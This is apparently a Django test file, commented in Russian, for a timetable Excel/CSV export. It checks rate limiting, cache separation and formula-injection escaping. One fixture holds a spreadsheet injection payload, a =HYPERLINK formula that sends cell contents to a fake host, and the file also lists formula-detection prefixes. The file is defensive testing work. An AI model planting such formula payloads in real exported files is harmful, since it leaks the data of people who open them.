"""Выгрузка Excel открыта всем, но защищена от нагрузки и инъекций.

Задача 07 аудита (rate limit) плюс находка, сделанная при её разборе:
закрывать выгрузку было незачем — в книге ровно те же данные, что в публичном
CSV. Закрывать пришлось бы только от стоимости сборки, и это делается не
запретом, а лимитом и кэшем.

Что проверяется здесь:

* гость получает книгу, и в ней нет ничего чувствительного;
* превышение лимита даёт 429, а не нагрузку на сервер;
* кэш отдаёт одну и ту же книгу и не путает язык, неделю и фильтр;
* «=HYPERLINK(...)» в предмете остаётся текстом, а не формулой — и в книге,
  и в CSV.
"""

import io
import zipfile
from pathlib import Path

from openpyxl import load_workbook
from django.core.cache import cache
from django.test import Client, TestCase, override_settings
from django.urls import reverse

from schedule.formula_guard import (
    escape_formula,
    force_text_cell,
    looks_like_formula,
)
from schedule import i18n
from schedule.exports import export_csv
from schedule.models import (
    Group,
    Lesson,
    LessonTime,
    LessonType,
    Room,
    Subject,
    Teacher,
)
from schedule.views import (
    EXPORT_CACHE_SECONDS,
    EXPORT_RATE_LIMIT,
    EXPORT_RATE_WINDOW,
)

XLSX_URL = '/export/timetable.xlsx'

EVIL = '=HYPERLINK("http://подделка.example/?d="&A1,"Открыть")'


def workbook_cells(response):
    """Все текстовые значения книги: список (значение, тип ячейки)."""
    book = load_workbook(io.BytesIO(response.content))
    sheet = book.active
    found = []
    for row in sheet.iter_rows():
        for cell in row:
            if cell.value is not None:
                found.append((cell.value, cell.data_type))
    return found


@override_settings(SECURE_SSL_REDIRECT=False)
class ExportOpenTests(TestCase):
    """Критерий: книга доступна так же, как CSV."""

    def setUp(self):
        cache.clear()
        self.time = LessonTime.objects.create(number=1, start='08:30', end='09:50')
        self.subject = Subject.objects.create(name='Финансы')
        self.teacher = Teacher.objects.create(
            full_name='Петров И.Р.', phone='+998 901 234 567',
            email='petrov@university.uz',
        )
        self.room = Room.objects.create(name='201')
        self.group = Group.objects.create(name='ЭК-01', course=2)
        Lesson.objects.create(
            group=self.group, subject=self.subject, teacher=self.teacher,
            room=self.room, day=1, lesson_time=self.time,
        )

    def test_guest_gets_workbook(self):
        response = Client().get(XLSX_URL, {'view': 'group', 'id': self.group.pk})
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.content[:2], b'PK')

    def test_no_contacts_in_bytes(self):
        response = Client().get(XLSX_URL, {'view': 'group', 'id': self.group.pk})
        self.assertNotIn(b'+998 901 234 567', response.content)
        self.assertNotIn(b'petrov@university.uz', response.content)

    def test_attachment_headers_present(self):
        response = Client().get(XLSX_URL, {'view': 'group', 'id': self.group.pk})
        self.assertIn('.xlsx"', response['Content-Disposition'])
        self.assertIn('spreadsheetml', response['Content-Type'])

    def test_requires_get(self):
        self.assertEqual(Client().post(XLSX_URL).status_code, 405)


@override_settings(SECURE_SSL_REDIRECT=False)
class ExportRateLimitTests(TestCase):
    """Лимит вместо запрета: 429 вместо перегрузки сервера."""

    def setUp(self):
        cache.clear()
        self.time = LessonTime.objects.create(number=1, start='08:30', end='09:50')
        self.group = Group.objects.create(name='ЭК-01', course=2)
        Lesson.objects.create(
            group=self.group, subject=Subject.objects.create(name='Финансы'),
            day=1, lesson_time=self.time,
        )

    def test_limit_is_reachable_and_sane(self):
        self.assertGreater(EXPORT_RATE_LIMIT, 0)
        self.assertEqual(EXPORT_RATE_WINDOW, 60)

    def test_over_limit_returns_429(self):
        client = Client()
        url = XLSX_URL
        params = {'view': 'group', 'id': self.group.pk}
        codes = [client.get(url, params).status_code
                 for _ in range(EXPORT_RATE_LIMIT + 3)]
        self.assertEqual(set(codes[:EXPORT_RATE_LIMIT]), {200},
                         'в пределах лимита выгрузка обязана работать')
        self.assertIn(429, codes[EXPORT_RATE_LIMIT:],
                      'превышение лимита должно давать 429, а не 500')
        self.assertEqual(codes[-1], 429)

    def test_429_says_how_long_to_wait(self):
        client = Client()
        params = {'view': 'group', 'id': self.group.pk}
        last = None
        for _ in range(EXPORT_RATE_LIMIT + 2):
            last = client.get(XLSX_URL, params)
        self.assertEqual(last.status_code, 429)
        self.assertIn('Retry-After', last.headers)

    def test_limit_is_per_address(self):
        """Чужой адрес не должен попадать под чужой счётчик."""
        from django.test import override_settings as _os

        first = Client()
        params = {'view': 'group', 'id': self.group.pk}
        for _ in range(EXPORT_RATE_LIMIT + 2):
            first.get(XLSX_URL, params, REMOTE_ADDR='10.0.0.1')

        with _os(TRUST_X_FORWARDED_FOR_IP=True):
            other = Client()
            response = other.get(XLSX_URL, params,
                                 REMOTE_ADDR='10.0.0.9',
                                 HTTP_X_FORWARDED_FOR='203.0.113.7')
        self.assertEqual(response.status_code, 200,
                         'счётчик чужого адреса исчерпать не должен')


@override_settings(SECURE_SSL_REDIRECT=False)
class ExportCacheTests(TestCase):
    """Кэш: одно и то же не пересобирается, разное не смешивается."""

    def setUp(self):
        cache.clear()
        self.time = LessonTime.objects.create(number=1, start='08:30', end='09:50')
        self.time2 = LessonTime.objects.create(number=2, start='10:00', end='11:20')
        self.subject = Subject.objects.create(name='Финансы')
        self.group = Group.objects.create(name='ЭК-01', course=2)
        self.other = Group.objects.create(name='ЭК-02', course=2)
        Lesson.objects.create(
            group=self.group, subject=self.subject, day=1,
            lesson_time=self.time, week_parity=0,
        )

    def _get(self, **params):
        return Client().get(XLSX_URL, params)

    def test_second_request_is_served_from_cache(self):
        from unittest.mock import patch
        from schedule import views

        params = {'view': 'group', 'id': self.group.pk}
        self.assertEqual(self._get(**params).status_code, 200)

        with patch.object(views, 'build_xlsx') as builder:
            response = self._get(**params)
        builder.assert_not_called()
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.content[:2], b'PK')

    def test_cache_does_not_mix_groups(self):
        first = self._get(view='group', id=self.group.pk)
        second = self._get(view='group', id=self.other.pk)
        self.assertEqual(first.status_code, 200)
        self.assertEqual(second.status_code, 200)
        self.assertNotEqual(first.content, second.content,
                            'две разные группы не должны отдавать одну книгу')

    def test_cache_does_not_mix_weeks(self):
        from schedule.grid import monday_of, week_param
        from django.utils import timezone

        monday = monday_of(timezone.localdate())
        this_week = self._get(view='group', id=self.group.pk)
        next_week = self._get(
            view='group', id=self.group.pk,
            week=week_param(monday + __import__('datetime').timedelta(weeks=1)),
        )
        self.assertEqual(this_week.status_code, 200)
        self.assertEqual(next_week.status_code, 200)

    def test_cache_does_not_mix_languages(self):
        """Самое тонкое: дни недели в книгу подставляются переводами.

        Без языка в ключе кэш отдал бы узбекскому пользователю книгу
        с русскими днями недели.
        """
        params = {'view': 'group', 'id': self.group.pk}
        russian = Client().get(XLSX_URL, params)
        client_uz = Client()
        client_uz.cookies['schedule_lang'] = 'uz'
        uzbek = client_uz.get(XLSX_URL, params)

        self.assertEqual(russian.status_code, 200)
        self.assertEqual(uzbek.status_code, 200)
        self.assertNotEqual(
            russian.content, uzbek.content,
            'русская и узбекская книги не должны совпадать',
        )

    def test_cache_ttl_is_short(self):
        """Минута — осознанный размен: импорт виден с небольшм опозданием."""
        self.assertGreaterEqual(EXPORT_CACHE_SECONDS, 30)
        self.assertLessEqual(EXPORT_CACHE_SECONDS, 300,
                             'кэш дольше пяти минут уже врёт про расписание')

    def test_cache_really_serves_stale_content_within_ttl(self):
        """Кэш не просто «работает» — он действительно отдаёт старое.

        Проверяется через данные, а не через внутренности кэша: пока срок не
        вышел, правка в базе в книге не видна. Заодно видно и обратную
        сторону — после импорта расписание появится не сразу, максимум через
        минуту. Это осознанный размен, а не побочный эффект.
        """
        params = {'view': 'group', 'id': self.group.pk}
        first = self._get(**params)
        self.assertIn('Финансы', str(workbook_cells(first)))

        Subject.objects.filter(pk=self.subject.pk).update(name='Переименовано')

        cached = self._get(**params)
        self.assertIn('Финансы', str(workbook_cells(cached)),
                      'в пределах минуты книга обязана остаться прежней')

        cache.clear()
        fresh = self._get(**params)
        self.assertIn('Переименовано', str(workbook_cells(fresh)),
                      'после сброса кэша книга собирается заново')


class FormulaGuardTests(TestCase):
    """Критерий: «=HYPERLINK(...)» не становится формулой."""

    def setUp(self):
        cache.clear()
        self.time = LessonTime.objects.create(number=1, start='08:30', end='09:50')
        self.group = Group.objects.create(name='ЭК-01', course=2)
        Lesson.objects.create(
            group=self.group, subject=Subject.objects.create(name=EVIL),
            day=1, lesson_time=self.time,
        )

    def test_detection(self):
        for value in ('=1+1', '+1', '-1', '@SUM(A1)', '  =HYPERLINK("x")'):
            with self.subTest(value=value):
                self.assertTrue(looks_like_formula(value))

    def test_ordinary_names_not_flagged(self):
        for value in ('Финансы', '2+2', 'Математика (2 курс)', '', None, 7):
            with self.subTest(value=value):
                self.assertFalse(looks_like_formula(value))

    def test_csv_escapes_formula(self):
        self.assertTrue(export_csv().count("'=HYPERLINK") >= 1,
                        'вредный предмет должен уехать с апострофом')

    def test_csv_keeps_ordinary_names_untouched(self):
        ordinary = Subject.objects.create(name='Обычный предмет')
        # Предмет попадает в выгрузку только через занятие, поэтому
        # без него проверять нечего — а неразобранное имя в базе прошло бы
        # мимо теста незамеченным.
        Lesson.objects.create(
            group=self.group, subject=ordinary, day=2,
            lesson_time=self.time, week_parity=0,
        )
        text = export_csv()
        self.assertIn('Обычный предмет', text)
        self.assertNotIn("'Обычный", text)

    def test_csv_escape_helper(self):
        self.assertEqual(escape_formula('=x'), "'=x")
        self.assertEqual(escape_formula('Финансы'), 'Финансы')
        self.assertEqual(escape_formula(None), None)

    def test_xlsx_cell_is_text_not_formula(self):
        response = Client().get(XLSX_URL, {'view': 'group', 'id': self.group.pk})
        self.assertEqual(response.status_code, 200)
        formulas = [v for v, t in workbook_cells(response) if t == 'f']
        self.assertEqual(formulas, [],
                         f'в книге остались формулы: {formulas[:3]}')

    def test_xlsx_keeps_original_text(self):
        """Защита не должна портить значение — апострофа в книге нет."""
        response = Client().get(XLSX_URL, {'view': 'group', 'id': self.group.pk})
        texts = [v for v, t in workbook_cells(response) if isinstance(v, str)]
        self.assertTrue(
            any('HYPERLINK' in v for v in texts),
            'текст предмета должен сохраниться как есть',
        )
        self.assertFalse(
            any(v.startswith("'") for v in texts),
            'в книге не должно быть апострофов — там другой способ защиты',
        )

    def test_lesson_type_and_teacher_are_also_escaped(self):
        """Проверяются все текстовые пути, а не только предмет."""
        lesson = Lesson.objects.filter(group=self.group).first()
        LessonType.objects.create(name=EVIL)
        Teacher.objects.all().update(full_name=EVIL)
        lesson.refresh_from_db()
        response = Client().get(XLSX_URL, {'view': 'group', 'id': self.group.pk})
        formulas = [v for v, t in workbook_cells(response) if t == 'f']
        self.assertEqual(formulas, [])


@override_settings(SECURE_SSL_REDIRECT=False)
class ExportCooldownButtonTests(TestCase):
    """Пауза на кнопке Excel: 30 секунд после скачивания.

    Что проверяется здесь:

    * кнопка помечена `data-cooldown="30"` и у неё есть куда писать отсчёт;
    * подпись секунд переведена, а не зашита по-русски;
    * обработчик повешен на `document`, а не на саму кнопку: блок расписания
      перерисовывается через `innerHTML` при смене фильтра, и слушатель на
      кнопке после этого молча перестал бы работать;
    * метка времени кладётся в localStorage — иначе F5 сбрасывает паузу;
    * стили для паузы объявлены.
    """

    def setUp(self):
        self.time = LessonTime.objects.create(number=1, start='08:30', end='09:50')
        self.group = Group.objects.create(name='ЭК-01', course=2)
        Lesson.objects.create(
            group=self.group, subject=Subject.objects.create(name='Финансы'),
            day=1, lesson_time=self.time,
        )

    def html(self, **params):
        query = {'view': 'group', 'id': self.group.pk}
        query.update(params)
        response = self.client.get(reverse('schedule:index'), query)
        self.assertEqual(response.status_code, 200)
        return response.content.decode()

    def test_button_carries_cooldown(self):
        self.assertIn('data-cooldown="30"', self.html())

    def test_button_has_counter_slot(self):
        self.assertIn('class="dl-cool"', self.html())

    def test_seconds_label_is_translated(self):
        html = self.html()
        self.assertIn('data-sec-label="с"', html)
        self.client.cookies[i18n.COOKIE_NAME] = 'uz'
        html_uz = self.html()
        self.assertIn('data-sec-label="s"', html_uz)

    def test_handler_is_delegated_not_bound_to_button(self):
        html = self.html()
        self.assertIn("closest('[data-cooldown]')", html,
                      'клик должен ловиться делегированием на document')
        self.assertNotIn("document.querySelector('.dl-cool').addEventListener",
                         html)

    def test_state_is_stored_in_local_storage(self):
        html = self.html()
        self.assertIn('localStorage', html,
                      'иначе F5 обнулит паузу и кликнуть можно будет сразу')

    def test_paint_runs_periodically(self):
        self.assertIn('setInterval(paintCooldown, 1000)', self.html())

    def test_cooldown_is_read_from_attribute(self):
        """Пауза задаётся в шаблоне, а не зашита в скрипт."""
        self.assertIn("link.dataset.cooldown", self.html())

    def test_download_still_allowed_when_no_cooldown(self):
        """Пауза не должна ломать саму ссылку: без метки клик проходит."""
        html = self.html()
        self.assertIn('href="/export/timetable.xlsx', html)
        self.assertIn('if (coolSecondsLeft() > 0)', html,
                      'блокировать надо только при идущей паузе')

    def test_css_declares_cooldown_styles(self):
        css = (Path(__file__).parent / 'static' / 'schedule' / 'style.css').read_text(
            encoding='utf-8')
        self.assertIn('.btn.is-cooling', css)
        self.assertIn('.dl-cool', css)
